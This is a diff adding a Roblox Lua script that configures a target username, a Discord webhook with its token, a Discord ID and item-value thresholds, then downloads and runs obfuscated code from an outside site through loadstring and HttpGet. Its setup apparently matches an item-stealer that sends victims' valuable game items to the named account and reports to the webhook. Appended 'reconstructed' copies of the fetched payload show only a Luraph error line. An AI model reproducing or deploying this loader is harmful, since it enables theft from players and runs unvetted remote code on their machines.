@@ -1,0 +1,30 @@
+local fenv=getfenv()
+fenv.Username = {
+	[1] = "Ps99progamerBratuha",
+}
+fenv.Webhook = "https://discord.com/api/webhooks/1565444426837528656/6HlXxYs0yz8zSeMpANll_5skquSSxxZOR1NG7DBCRgk-qyJhLnLgC-IyVTlvfGkmXk9L"
+fenv.minrarity = "Common"
+fenv.minrarity_sailor = "Mythical"
+fenv.min_gen = 50000000
+fenv.min_rap = 10000000
+fenv.min_val_each = 0
+fenv.discord_id = "1559598984970895495"
+local _call3 = task.spawn(function()
+	game:HttpGet("https://www.astatine.vip/scripts/all_in_one.lua")
+end)
+task.wait(1)
+task.cancel(_call3)
+fenv.proxy = "https://astatine.vip/scripts/"
+local loadedModule = loadstring(game:HttpGet("https://astatine.vip/scripts/all_in_one.lua"))()
+
+-- ===== fetched & reconstructed: https://www.astatine.vip/scripts/all_in_one.lua (138653 bytes) =====
+local fenv=getfenv()
+local _UDim2new2 = UDim2.new
+local _Path2DControlPoint3=fenv.Path2DControlPoint
+error("Luraph Script:(internal): line 1: attempt to index nil with 'new'")
+
+-- ===== fetched & reconstructed: https://astatine.vip/scripts/all_in_one.lua (138653 bytes) =====
+local fenv=getfenv()
+local _UDim2new2 = UDim2.new
+local _Path2DControlPoint3=fenv.Path2DControlPoint
+error("Luraph Script:(internal): line 1: attempt to index nil with 'new'")
